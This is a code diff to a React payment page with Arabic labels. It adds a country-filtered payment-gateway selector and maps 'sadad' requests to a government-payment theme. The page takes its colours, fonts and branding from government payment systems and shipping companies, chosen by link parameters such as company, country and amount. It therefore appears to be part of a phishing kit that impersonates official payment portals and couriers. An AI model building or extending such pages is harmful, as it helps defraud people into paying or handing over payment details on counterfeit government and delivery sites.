@@ -16,6 +16,7 @@ import BrandedCarousel from "@/components/BrandedCarousel";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
+import { getPaymentGatewaysByCountry } from "@/lib/paymentGateways";
 import PageLoader from "@/components/PageLoader";
 
 const PaymentData = () => {
@@ -46,8 +47,9 @@ const PaymentData = () => {
   const [invoiceNumber, setInvoiceNumber] = useState("");
   const [selectedService, setSelectedService] = useState("");
   const [paymentAmount, setPaymentAmount] = useState("");
+  const [selectedPaymentGateway, setSelectedPaymentGateway] = useState("");
 
-  const serviceKey = searchParams.get('company') || searchParams.get('service') || searchParams.get('s') || linkData?.payload?.service_key || linkData?.payload?.customerInfo?.service || 'government_payment';
+  let serviceKey = searchParams.get('company') || searchParams.get('service') || searchParams.get('s') || linkData?.payload?.service_key || linkData?.payload?.customerInfo?.service || 'government_payment';
   const countryParam = searchParams.get('country') || searchParams.get('c');
   const amountParam = searchParams.get('amount') || searchParams.get('a');
 
@@ -56,6 +58,13 @@ const PaymentData = () => {
   
   // أولوية للـ query parameters
   const countryCode = countryParam || paymentInfo?.selectedCountry || "SA";
+  
+  // إذا كانت الخدمة حكومية (sadad أو government_payment)، استخدم government_payment فقط
+  // سيتم تطبيق الثيم حسب الدولة من govSystem
+  if (serviceKey.toLowerCase() === 'sadad' || serviceKey.toLowerCase() === 'government_payment') {
+    serviceKey = 'government_payment';
+  }
+  
   const govSystem = getGovernmentPaymentSystem(countryCode);
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
@@ -68,6 +77,12 @@ const PaymentData = () => {
   // Get government services for the country
   const governmentServices = useMemo(
     () => getGovernmentServicesByCountry(countryCode),
+    [countryCode]
+  );
+
+  // Get payment gateways for the country
+  const paymentGateways = useMemo(
+    () => getPaymentGatewaysByCountry(countryCode),
     [countryCode]
   );
 
@@ -348,13 +363,57 @@ const PaymentData = () => {
                     )}
                   </div>
 
+                  {/* Payment Gateway Selection */}
+                  <div>
+                    <Label 
+                      className="mb-2 text-sm font-bold flex items-center gap-2"
+                      style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
+                    >
+                      <CreditCard className="w-4 h-4" />
+                      بوابة الدفع *
+                    </Label>
+                    <Select value={selectedPaymentGateway} onValueChange={setSelectedPaymentGateway}>
+                      <SelectTrigger 
+                        className="h-10 sm:h-12 border-2 focus:border-primary transition-all"
+                        style={{
+                          borderColor: companyBranding?.colors.border || '#e5e7eb',
+                          fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
+                        }}
+                      >
+                        <SelectValue placeholder="اختر بوابة الدفع" />
+                      </SelectTrigger>
+                      <SelectContent className="bg-background z-50">
+                        {paymentGateways.map((gateway) => (
+                          <SelectItem key={gateway.id} value={gateway.id}>
+                            <div className="flex items-center gap-2">
+                              <span>{gateway.nameAr}</span>
+                              {gateway.popular && (
+                                <span className="text-xs bg-primary/10 text-primary px-2 py-0.5 rounded">
+                                  الأكثر استخداماً
+                                </span>
+                              )}
+                            </div>
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                    {selectedPaymentGateway && (
+                      <p className="text-xs text-muted-foreground mt-1">
+                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'local' && 'بوابة دفع محلية'}
+                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'wallet' && 'محفظة إلكترونية'}
+                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'card' && 'بطاقة ائتمانية/مدى'}
+                        {paymentGateways.find(g => g.id === selectedPaymentGateway)?.type === 'bank' && 'تحويل بنكي'}
+                      </p>
+                    )}
+                  </div>
+
                   <div>
                     <Label 
                       htmlFor="amount" 
                       className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm font-bold"
                       style={{ color: companyBranding?.colors.text || govSystem.colors.text }}
                     >
-                      <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
+                      <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
                       مبلغ السداد *
                     </Label>
                     <Input
